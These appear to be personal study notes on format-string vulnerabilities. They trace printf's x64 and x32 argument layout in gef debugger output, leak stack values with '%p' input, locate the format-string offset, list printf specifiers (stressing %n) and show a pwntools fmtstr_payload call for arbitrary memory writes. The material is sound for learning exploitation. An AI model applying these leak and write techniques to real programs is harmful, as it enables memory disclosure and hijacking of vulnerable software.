<details>
    <summary>Zusammenfassung</summary>
    Hier kommt der Inhalt.


```
x64 int printf (rdi, rsi, rdx, rcx, r8, r9, rsp, rsp+0x8, rsp+0x10, ...);
x32 int printf (esp, esp+4, esp+8, esp+0x0c, esp+0x10, esp+14, esp+18, esp+0x1c , ...);
```

# x64
`int printf ( const char * format, ... );`
`char *fgets(char *s, int size, FILE *stream);`

first we need to find find the `call printf()`

```
   0x000000000040128d <+72>:    lea    rax,[rbp-0x50]       
   0x0000000000401291 <+76>:    mov    esi,0x1f4
   0x0000000000401296 <+81>:    mov    rdi,rax              
   0x0000000000401299 <+84>:    call   0x4010c0 <fgets@plt>
   0x000000000040129e <+89>:    lea    rax,[rbp-0x50]
   0x00000000004012a2 <+93>:    mov    rdi,rax
   0x00000000004012a5 <+96>:    mov    eax,0x0
=> 0x00000000004012aa <+101>:   call   0x4010b0 <printf@plt>
```

notice before printf() is called rdi will be set to the addr of `[rbp-0x50]`:

```
   0x000000000040129e <+89>:    lea    rax,[rbp-0x50]
   0x00000000004012a2 <+93>:    mov    rdi,rax
```

```
$rbp  : 0x00007fffffffdf20  →  0x0000000000000000

0x00007fffffffdf20 - 0x50 = 0x00007fffffffded0
```

and rax will be set to 0x0
```
   0x00000000004012a5 <+96>:    mov    eax,0x0
```


break at `→   0x4012aa <main+101>       call   0x4010b0 <printf@plt>`
```
$rax   : 0x0               
$rbx   : 0x00000000004012d0  →  <__libc_csu_init+0> endbr64 
$rcx   : 0x00000000004052b8  →  0x0000000000000000
$rdx   : 0x0               
$rsp   : 0x00007fffffffdec0  →  0x0000000000400040  →  0x0000000400000006
$rbp   : 0x00007fffffffdf20  →  0x0000000000000000
$rsi   : 0x00000000004052a1  →  "p %p %p %p %p %p %p %p\n"
$rdi   : 0x00007fffffffded0  →  "%p %p %p %p %p %p %p %p\n"
$rip   : 0x00000000004012aa  →  <main+101> call 0x4010b0 <printf@plt>
$r8    : 0x00007fffffffded0  →  "%p %p %p %p %p %p %p %p\n"
$r9    : 0x7c              
$r10   : 0x00007ffff7fa7be0  →  0x00000000004056a0  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x00000000004010f0  →  <_start+0> endbr64 
$r13   : 0x00007fffffffe010  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdec0│+0x0000: 0x0000000000400040  →  0x0000000400000006    ← $rsp
0x00007fffffffdec8│+0x0008: 0x0000000100f0b5ff
0x00007fffffffded0│+0x0010: "%p %p %p %p %p %p %p %p\n"  ← $rdi, $r8
0x00007fffffffded8│+0x0018: "%p %p %p %p %p\n"
0x00007fffffffdee0│+0x0020: "p %p %p\n"
0x00007fffffffdee8│+0x0028: 0x0000000000401300  →  <__libc_csu_init+48> dec DWORD PTR [rax-0x3f]
0x00007fffffffdef0│+0x0030: 0x00007ffff7facfc8  →  0x0000000000000000
0x00007fffffffdef8│+0x0038: 0x00000000004012d0  →  <__libc_csu_init+0> endbr64 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40129e <main+89>        lea    rax, [rbp-0x50]
     0x4012a2 <main+93>        mov    rdi, rax
     0x4012a5 <main+96>        mov    eax, 0x0
 →   0x4012aa <main+101>       call   0x4010b0 <printf@plt>
   ↳    0x4010b0 <printf@plt+0>   endbr64 
        0x4010b4 <printf@plt+4>   bnd    jmp QWORD PTR [rip+0x2f6d]        # 0x404028 <printf@got.plt>
        0x4010bb <printf@plt+11>  nop    DWORD PTR [rax+rax*1+0x0]
        0x4010c0 <fgets@plt+0>    endbr64 
        0x4010c4 <fgets@plt+4>    bnd    jmp QWORD PTR [rip+0x2f65]        # 0x404030 <fgets@got.plt>
        0x4010cb <fgets@plt+11>   nop    DWORD PTR [rax+rax*1+0x0]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   $rdi = 0x00007fffffffded0 → "%p %p %p %p %p %p %p %p\n"
)


```
notice:


rsp = `0x00007fffffffdec0│+0x0000: 0x0000000000400040  →  0x0000000400000006     ← $rsp`

inspect the stack at 0x00007fffffffdec0

```
gef➤  tel 0x00007fffffffdec0
0x00007fffffffdec0│+0x0000: 0x0000000000400040  →  0x0000000400000006    ← $rsp
0x00007fffffffdec8│+0x0008: 0x0000000100f0b5ff
0x00007fffffffded0│+0x0010: "%p %p %p %p %p %p %p %p\n"  ← $rdi, $r8
0x00007fffffffded8│+0x0018: "%p %p %p %p %p\n"
0x00007fffffffdee0│+0x0020: "p %p %p\n"
0x00007fffffffdee8│+0x0028: 0x0000000000401300  →  <__libc_csu_init+48> dec DWORD PTR [rax-0x3f]
0x00007fffffffdef0│+0x0030: 0x00007ffff7facfc8  →  0x0000000000000000
0x00007fffffffdef8│+0x0038: 0x00000000004012d0  →  <__libc_csu_init+0> endbr64 
0x00007fffffffdf00│+0x0040: 0x0000000000000000
0x00007fffffffdf08│+0x0048: 0x00000000004010f0  →  <_start+0> endbr64 

```
this is what printf() prints back to us
```
0x4052a1 (nil) 0x4052b8 0x7fffffffded0 0x7c 0x400040 0x100f0b5ff 0x7025207025207025
```
`int printf ( const char * format, ... );`
`int printf (rdi, rsi, rdx, rcx, r8, r9, rsp, rsp+0x8, rsp+0x10, ...);`

rdi = holds the pointer to the Format_string

```

$rdi        : 0x00007fffffffded0  →  "%p %p %p %p %p %p %p %p\n"

$rsi        : 0x00000000004052a1  →  "p %p %p %p %p %p %p %p\n"
$rdx        : 0x0  
$rcx        : 0x00000000004052b8  →  0x0000000000000000
$r8         : 0x00007fffffffded0  →  "%p %p %p %p %p %p %p %p\n"
$r9         : 0x7c 

$rsp        : 0x00007fffffffdec0  →  0x0000000000400040  →  0x0000000400000006
$rsp+0x8    : 0x00007fffffffdec8│+0x0008: 0x0000000100f0b5ff
$rsp+0x10   : 0x00007fffffffded0│+0x0010: "%p %p %p %p %p %p %p %p\n"    ← $rdi, $r8         


```
notice:
that `0x7025207025207025 = "%p %p %p"` so our Format_string is stored @ `rsp+0x10`
and `$r8 : 0x00007fffffffded0` holds a pointer to out Format_string


</details>
















# x32
`int printf ( const char * format, ... );`
`char *fgets(char *s, int size, FILE *stream);`

first we need to find find the `call printf()`

```
   0x080492bf <+94>:    push   eax
   0x080492c0 <+95>:    push   0x40
   0x080492c2 <+97>:    lea    eax,[ebp-0x4c]               #ebp-0x4c Format_String
   0x080492c5 <+100>:   push   eax
   0x080492c6 <+101>:   call   0x80490b0 <fgets@plt>
   0x080492cb <+106>:   add    esp,0x10
   0x080492ce <+109>:   sub    esp,0xc
   0x080492d1 <+112>:   lea    eax,[ebp-0x4c]               #ebp-0x4c Format_String
   0x080492d4 <+115>:   push   eax                          # notice that push   eax
=> 0x080492d5 <+116>:   call   0x80490a0 <printf@plt>
```

notice before printf() is called eax will be set to the addr of `[ebp-0x4c]`:

`$ebp   : 0xffffd0b8  →  0x00000000`

```
0xffffd0b8 - 0x4c = 0xffffd06c
```

so after the `lea    eax,[ebp-0x4c]` eax will be = 0xffffd06c
and than eax gets pushed to esp

```
0x080492d4 <+115>:  push   eax                          
```

`0xffffd050│+0x0000: 0xffffd06c  →  "%p %p %p %p %p %p %p\n"     ← $esp`


break at `→  0x80492d5 <main+116>       call   0x80490a0 <printf@plt>`
```

$eax   : 0xffffd06c  →  "%p %p %p %p %p %p %p\n"
$ebx   : 0x0804bfd0  →  0x0804bed8  →  0x00000001
$ecx   : 0x0       
$edx   : 0xfbad2288
$esp   : 0xffffd050  →  0xffffd06c  →  "%p %p %p %p %p %p %p\n"
$ebp   : 0xffffd0b8  →  0x00000000
$esi   : 0xf7fac000  →  0x001ead6c
$edi   : 0xf7fac000  →  0x001ead6c
$eip   : 0x080492d5  →  <main+116> call 0x80490a0 <printf@plt>
$eflags: [zero carry parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd050│+0x0000: 0xffffd06c  →  "%p %p %p %p %p %p %p\n"  ← $esp
0xffffd054│+0x0004: 0x00000040 ("@"?)
0xffffd058│+0x0008: 0xf7fac580  →  0xfbad2288
0xffffd05c│+0x000c: 0x08049292  →  <main+49> sub esp, 0xc
0xffffd060│+0x0010: 0x009c27ab
0xffffd064│+0x0014: 0x00000534
0xffffd068│+0x0018: 0x00000003
0xffffd06c│+0x001c: "%p %p %p %p %p %p %p\n"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80492ce <main+109>       sub    esp, 0xc
●   0x80492d1 <main+112>       lea    eax, [ebp-0x4c]
    0x80492d4 <main+115>       push   eax
 →  0x80492d5 <main+116>       call   0x80490a0 <printf@plt>
   ↳   0x80490a0 <printf@plt+0>   endbr32 
       0x80490a4 <printf@plt+4>   jmp    DWORD PTR ds:0x804bfdc
       0x80490aa <printf@plt+10>  nop    WORD PTR [eax+eax*1+0x0]
       0x80490b0 <fgets@plt+0>    endbr32 
       0x80490b4 <fgets@plt+4>    jmp    DWORD PTR ds:0x804bfe0
       0x80490ba <fgets@plt+10>   nop    WORD PTR [eax+eax*1+0x0]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   [sp + 0x0] = 0xffffd06c → "%p %p %p %p %p %p %p\n",
   [sp + 0x4] = 0x00000040
)



```
notice:

esp = `0xffffd050│+0x0000: 0xffffd06c  →  "%p %p %p %p %p %p %p\n"   ← $esp`

inspect the stack at 0xffffd050

```
gef➤  tel 0xffffd050
0xffffd050│+0x0000: 0xffffd06c  →  "%p %p %p %p %p %p %p\n"  ← $esp
0xffffd054│+0x0004: 0x00000040 ("@"?)
0xffffd058│+0x0008: 0xf7fac580  →  0xfbad2288
0xffffd05c│+0x000c: 0x08049292  →  <main+49> sub esp, 0xc
0xffffd060│+0x0010: 0x009c27ab
0xffffd064│+0x0014: 0x00000534
0xffffd068│+0x0018: 0x00000001
0xffffd06c│+0x001c: "%p %p %p %p %p %p %p\n"
0xffffd070│+0x0020: "p %p %p %p %p %p\n"
0xffffd074│+0x0024: "%p %p %p %p\n"
```
this is what printf() prints back to us
```
0x40 0xf7fac580 0x8049292 0x9c27ab 0x534 0x1 0x25207025
```
notice:
that `0x25207025 = "%p %"` so our Format_string is stored @ `esp+0x1c`

`int printf (esp, esp+4, esp+8, esp+0x0c, esp+0x10, esp+14, esp+18, esp+0x1c , ...);`

`esp` holds the pointer to our Format_string
`esp+0x1c` is the addr esp points to
```
$esp+0x04    0xffffd054│+0x0004: 0x00000040 ("@"?)
$esp+0x08    0xffffd058│+0x0008: 0xf7fac580  →  0xfbad2288
$esp+0x0c    0xffffd05c│+0x000c: 0x08049292  →  <main+49> sub esp, 0xc
$esp+0x10    0xffffd060│+0x0010: 0x009c27ab
$esp+0x14    0xffffd064│+0x0014: 0x00000534
$esp+0x18    0xffffd068│+0x0018: 0x00000001
$esp+0x1c    0xffffd06c│+0x001c: "%p %p %p %p %p %p %p\n"
```




















# Format table
```
specifier       Output                                      Example

d or i          Signed decimal integer                              392
u               Unsigned decimal integer                            7235
o               Unsigned octal                                      610
x               Unsigned hexadecimal integer                        7fa
X               Unsigned hexadecimal integer (uppercase)            7FA
f               Decimal floating point, lowercase                   392.65
F               Decimal floating point, uppercase                   392.65
e               Scientific notation (mantissa/exponent), lowercase  3.9265e+2
E               Scientific notation (mantissa/exponent), uppercase  3.9265E+2
g               Use the shortest representation: %e or %f           392.65
G               Use the shortest representation: %E or %F           392.65
a               Hexadecimal floating point, lowercase               -0xc.90fep-2
A               Hexadecimal floating point, uppercase               -0XC.90FEP-2
c               Character                                           a
s               String of characters                                sample
p               Pointer address                                     b8000000

n               Nothing printed.
                The corresponding argument must be a pointer to a signed int.
                The number of characters written so far is stored in the pointed location.


%               A % followed by another % character will write a single % to the stream. %

```

most interesing imo. are 
```
x               Unsigned hexadecimal integer                        7fa
c               Character                                           a
s               String of characters                                sample
p               Pointer address                                     b8000000

n               Nothing printed.
                The corresponding argument must be a pointer to a signed int.
                The number of characters written so far is stored in the pointed location.
```

some examples for interesting specifieres such as `%n %hn %hhn` and `%10000c` will come next

# pwntools Format string payload generator 
```
writes = {hex(where): hex(what)}
payload = pwnlib.fmtstr.fmtstr_payload(6, writes, numbwritten=0, write_size='byte') 
```

```
Parameters:    

    offset (int) – the first formatter’s offset you control
    writes (dict) – dict with addr, value {addr: value, addr2: value2}
    numbwritten (int) – number of byte already written by the printf function
    write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
    overflows (int) – how many extra overflows (at size sz) to tolerate to reduce the length of the format string
    strategy (str) – either ‘fast’ or ‘small’ (‘small’ is default, ‘fast’ can be used if there are many writes)

Returns:    

The payload in order to do needed writes
```
